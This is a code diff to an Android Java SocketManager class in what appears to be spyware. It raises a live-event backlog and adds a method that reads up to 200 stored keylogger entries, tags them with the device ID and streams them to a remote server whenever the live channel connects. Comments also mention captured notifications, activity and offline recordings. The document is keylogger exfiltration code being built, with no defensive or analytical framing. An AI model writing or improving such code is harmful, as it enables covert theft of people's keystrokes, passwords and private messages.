@@ -147,7 +147,7 @@ public class SocketManager {
     // a small bounded backlog so a transient live-channel race does not lose
     // keylogger/notification/activity entries that are already stored locally.
     private final ArrayDeque<JSONObject> pendingLiveEvents = new ArrayDeque<>();
-    private static final int MAX_PENDING_LIVE_EVENTS = 200;
+    private static final int MAX_PENDING_LIVE_EVENTS = 1000;
     // Single-thread executor prevents multiple concurrent live loops from stacking up
     private final ExecutorService liveExecutor = Executors.newSingleThreadExecutor();
 
@@ -1019,6 +1019,7 @@ public class SocketManager {
                 liveOut.print(msg.toString() + "\n");
                 liveOut.flush();
                 flushPendingLiveEventsLocked();
+                flushPersistedKeylogsOnConnect();
                 Log.i(TAG, "Live channel connected");
                 // Upload any offline recordings that were saved while disconnected
                 uploadPendingOfflineRecordings();
@@ -1136,6 +1137,30 @@ public class SocketManager {
             } catch (Exception e) {
                 return;
             }
+        }
+    }
+
+    /** Push recent persisted keylogs from local storage when live channel connects. */
+    private void flushPersistedKeylogsOnConnect() {
+        if (!liveConnected || liveOut == null) return;
+        try {
+            JSONObject result = logManager.getLogs(200);
+            if (result.optBoolean("success", false)) {
+                JSONArray logs = result.optJSONArray("logs");
+                if (logs != null) {
+                    for (int i = 0; i < logs.length(); i++) {
+                        JSONObject entry = logs.optJSONObject(i);
+                        if (entry != null) {
+                            entry.put("deviceId", DeviceInfo.getDeviceId(context));
+                            liveOut.print(new JSONObject().put("event", "keylog:entry").put("data", entry).toString() + "\n");
+                        }
+                    }
+                    liveOut.flush();
+                    Log.i(TAG, "Flushed " + logs.length() + " persisted keylogs on live connect");
+                }
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "flushPersistedKeylogsOnConnect error: " + e.getMessage());
         }
     }
 
